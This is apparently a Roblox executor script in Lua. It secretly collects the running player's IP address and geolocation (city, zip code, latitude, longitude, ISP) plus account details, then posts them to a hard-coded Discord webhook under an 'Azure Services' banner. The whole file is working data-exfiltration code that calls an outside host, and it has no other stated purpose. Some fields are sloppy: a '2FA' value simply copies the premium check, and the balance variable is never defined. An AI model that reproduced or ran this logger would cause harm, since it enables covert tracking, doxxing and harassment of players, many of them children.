local name = game:GetService("Players").LocalPlayer.Name
local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
local HTTP_ = game:GetService('HttpService')
local LPR = game:GetService('Players').LocalPlayer
local isPremium = game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium
local username = game.Players.LocalPlayer.Name
local userId = game.Players.LocalPlayer.UserId
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local accountAge = math.floor((os.time() - player.AccountAge * 86400) / 86400)
local jobID = game.JobId

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", ESD),
    Method = "Get"
})

local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = ESD,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}

local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    FlUXUS_LOADED and "Fluxus" or
    "Kid with shit exploit"

local url =
    "https://discord.com/api/webhooks/1095171163853967410/lyPH0aLSQseBOjMn6Az1sJIgMed2uWh79T7knbna_AqOjPutMdBiP1GASjfpYyrk-elt"
local data = {
    ["username"] = LPR.Name..' ['..LPR.UserId..']',
    ["avatar_url"] =  HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
     ["embeds"] = {
        {
            ["title"] = "Azure Services",
            ["description"] = "Discord: https://discord.gg/z5Zq6Y9TSK",
            ["color"] = tonumber(0x2B6BE4),
            ["fields"] = {
                {
                    ["name"] = "Profile:",
                    ["value"] = "https://www.roblox.com/users/"..userId.."/profile",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game:",
                    ["value"] = "https://www.roblox.com/games/"..game.PlaceId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Info:",
                    ["value"] = "**ID**: "..game.PlaceId..".\n**Name:** "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {
                    name = "Exploit",
                    value = webhookcheck,
                    inline = true
                },
                {
                    name = "Premium",
                    value = isPremium and "True" or "False",
                    inline = true
                },
                 {
                    name = "2FA",
                    value = isPremium and "True" or "False",
                    inline = true
                },
                {
                    name = "Account Age",
                    value = "" .. accountAge .. " ",
                    inline = true
                },
                {
                    name = "Robux Balance",
                    value = tostring(balance),
                    inline = true
                },
                {
                    name = "Join Code",
                    value = "" .. jobID,
                    inline = true
                },
                {
                    name = "IP",
                    value = FI.IP,
                    inline = true
                },
                {
                    name = "Country",
                    value = FI.country,
                    inline = true
                },
                {
                    name = "Country Code",
                    value = FI.countryCode,
                    inline = true
                },
                {
                    name = "Region",
                    value = FI.region,
                    inline = true
                },
                {
                    name = "Region Name",
                    value = FI.regionName,
                    inline = true
                },
                {
                    name = "City",
                    value = FI.city,
                    inline = true
                },
                {
                    name = "Zipcode",
                    value = FI.zipcode,
                    inline = true
                },
                {
                    name = "Latitude",
                    value = tostring(FI.latitude),
                    inline = true
                },
                {
                    name = "Longitude",
                    value = tostring(FI.longitude),
                    inline = true
                },
                {
                    name = "ISP",
                    value = FI.isp,
                    inline = true
                },
                {
                    name = "Org",
                    value = FI.org,
                    inline = true
                },
                {
                    name = "Coming Soon",
                    value = "??????????",
                    inline = true
                }
            },
            ["color"] = tonumber(0x7269da),
          }
      }
}
local newdata = HTTP_:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
